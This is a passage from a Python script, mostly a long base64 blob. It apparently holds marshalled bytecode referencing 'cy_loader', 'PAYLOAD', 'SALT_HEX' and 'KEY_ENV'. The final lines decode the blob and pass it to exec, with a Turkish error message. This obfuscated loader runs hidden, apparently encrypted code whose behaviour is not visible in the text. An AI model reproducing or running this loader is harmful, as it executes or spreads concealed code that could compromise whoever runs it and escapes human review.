wQnpNV1ZGUnVWMk5hTFNqMEF3MWpNU0RrRDJ1b01QdU9JRjVkWEh0MFhHZ0pZMGd4TGxTVEVQa0hXbGdTSjJ1elZGUnZZbEVYQ1NMa1ZGcGRXdlYwWG00d1kzWnhHVGNvRlNWbUJIcURFUU5hWUZEZUMwQUtubHFGVko4d0R6a2haUE1TTEg1bnBSTVJZU0RhRXZXSkhJY1RDSE93REZEbVpGTGVNbE12cUZrU0xIY3lGUFJnWndPT1ZGUnlXR1J1VkZSdkN3dVZCUzlkRUkwZG9LRHVZR09RTVBSdVdGSHpWRlJ1Vnc0MG8yV0VLMElvS2FFYVZHdDNJVElUSzNIY0NKcGFadmplRFVXVW9KdWFXYUg3V0hEaEhKa29FdnVZQXZWL0pGVmJMeE1zcVMwZ0V5TjJvdzFOQjExcm5QNGxIdldtVkZSdVZ3NHhabVJ6WDBJdUZ6SVZWRjBrQ0Z4dVZGSHlYdlJ1VkZWK0F3WnhxSkFTS1A0M25sUmRJU04vRVFOYVlGRDlwUXVES0hFV29Ka2dWeEhocFR1T0hKTDZIUkFBRFNjbUR6YmJKMGdRR3hJaldRMWpCR1NvRXhIN1pSMHZYSXBkb1ExaktVU3ZFVExpbzIxTkNRNWxabFdSWnhPdURJU3pHU2NPSVNNSVhSUjNXbUVzRVA1RkwyandEeXhtQVE5TEoyV3lFSWIwcUl4dVh5RUdEUkVYVkpNaUVRZndWbUVTTDNTU0tsUmdZMGNYVkZSeVdSZnVWRlJ2Q3ZIallIUmhFSXVjVzBqdUJRcXRuUkRoRkZTa0R6amhFdk1BcUlxYkpSTGlZMkQ1VkZSdVdsZnVDSUR3Q1BSOURKeGtWRzR3QlFwdlZGNVdFbFIrVm10M1ZJdVhNd0R1Q0Y5cVpsUjlZMTBtVkcwaU15VnVJM1YvWFBTbUJSSGJWd3lHRmx0dklUNUVYUFdqQVNwYlZtTUNLRmNscHg1QkNGUzBKSGNRVkdrbEhHeHZCSGNIWHZSOEd3eGFWR2tCQkZwdUNSNDVXbFI4R3d4YVZHa0JCRnB1Q1I0NVdsUjhHd3hhVkdrQkJGcHVDU01Lb0Z0Y01RV3RWRzlBQTBwdUNUT1NZbFI5SDNIa1ZHMXpZUXFscHpPUFlLV0tFR2pncHdqZEF2MWtxSkRqWUtTbkZGYmdwRzlWcGxieEFTZmJEUFNWR3gxeVZGUnhHUU82cnZSdVZGUnZWRlJ1VkZWdVZGUnVNUFJ1VkZWL1Z3eDRFRklPWUZBSVlsNGpDUXFSRUl1dFZIZnVabER1Q3d1d0gydWVFSXV0VkhmdVlGOUFGbFJ1V0ZFWlZGUnVWMVJ3STNJalowRGhBbEV1QUdabEx4SHVZR1NtQmxSdVdGSXpWRlJ1VkhidUgxV25NME10WFMwdVZHajhYdlc2cnZSOENQYnZWd3g0RUZIMkd4TmNNUkkwTUlFR1ZGMU9BUUx1Rkg5Zkt2U3ZwSnFYVkgxWUhVUnVYMWJiWXZSeURVRVNFeXg4S2FOdVczRVpDSE43SVJNdExRQVRZbVplREdNY294QWFuUUFQWG00M01IeVRFU09mWHhOOENtRHlFUldDWG1NVlZLU2FGMHB5Vm1Od0V4RURHdjlTS2FOZFpQUmdaMHF5VkZSeVdSZnVWRlJ2Q3ZIallIUmhFSXVjVzBqdUJRcWZvSFNHWVJPaEQyeWRXUHlPSVFXV1p6Y0hWbXVwRUtXZkNIUnVWRlJiRFJ5ekYwdVlDUEhob3ZMd1dtMDVvMFYwSndWOVZsSUpZeVdSWTF0OEFtSDJYU2N0QXc1anB6cXNvUEVqSnpObUZHY0ZMUUFUSVBnU0p6TUNCdmdSRTFiakl6SHhxSTFPSVIxbVhIQUFKMTBnQXZaNXFROVBHMU94V1FJMUJ2a2tESUExSUZFUEF2SUVYMFNGbzBrZURHdGRad3h2WHZqMEpGUnVWMlozV3h1Uk1HVmhabVdGcDBNUU13eHZEU3BnRFA4Zm9URWlFenBhR0pmM0VKVmlKenlQb1FxRlhRQWxNd01wRUlxRUFSTnVZRjhpREZSdVdGRVZWRlJ1Vnc0bHFKeWpKRzFqSjBjZUJTV1VFejA1WkdnSEp2Wi9BR3VCREg4NkNTcVNLSmNRV3ZSZ1kwU1VWRlJ5V1IwdVZGUnZDdnRhVncwM0VJMGRvS0R1WUdOOUx2UnVXRkVhVkZSdVZ3NDNaUFI3TXcxa0N4eXFFdnkwTGxNT0h4VmVKeEVXTVNTakVKQUNNSVJ1VkZIeUVQUnVWRlYrQ3prTG52eVNMSFNzRWxSZ1owRXhWRlJ5V0p0dVZGUndIRlp3b211SkRJV0hYMngzRm1rUk0ycGFYSHA1RHpqNFYzVnpCUTh3bzBXZkExdGZGUFN2R3Y5UW5GU2FXMFYyVnhNcVZGUnlXUmZ1VkZSdkN2SGpZSFJoRUl1Y1cwanVCUXFxRFJEaUkzWmdEMnQxTVFWdVZGUnZDbUQ1WVE5cVYxU01ad1p3SEl4bFpsTGdabEg3VjFTdllRTnhabWI0WmxBRkJ5TDhWYU8wRndweEFTZjluUEVjcFNqK1dUeWpLU054bktPcERGRWNwU2ovV1R5aktHZnlGMVNoQ3ZNd25HcDlEUWI3WUZ1T1p4T2FHME9ERHpMdURIMTFERnRtRHd1YVh4U2JvUXVGWkpaaFhsWm1Ed2NESTBOMW8zUzBEVGpmb1JnT25HMGRJbVNBWW05bFp5OWdDRkhrblBMM0dtVmNESTFCWkZrbG9QRD3aBXBsYWlu2gApAXInAAAAKRZaCWN5X2xvYWRlcnICAAAAcgMAAADaCUV4Y2VwdGlvbnIMAAAAcgUAAAByEwAAAHI0AAAAcgoAAAByEAAAAHISAAAAchYAAADaA3N0cnIhAAAAchwAAAByJgAAAFoHUEFZTE9BRFoETU9ERVoIU0FMVF9IRVhaB0tFWV9FTlbaBGNvZGXaBGV4ZWNyCAAAAHIIAAAAcggAAAByCQAAANoIPG1vZHVsZT4DAAAAcyIAAAACARQBDAEmAggDCAMIAwgDEgMSBxgMDggEAQQBBAEEAhIB"""

try:
    blob = base64.b64decode(DATA)
    code = marshal.loads(blob)
    exec(code)
except Exception as e:
    print("Hata:", e)
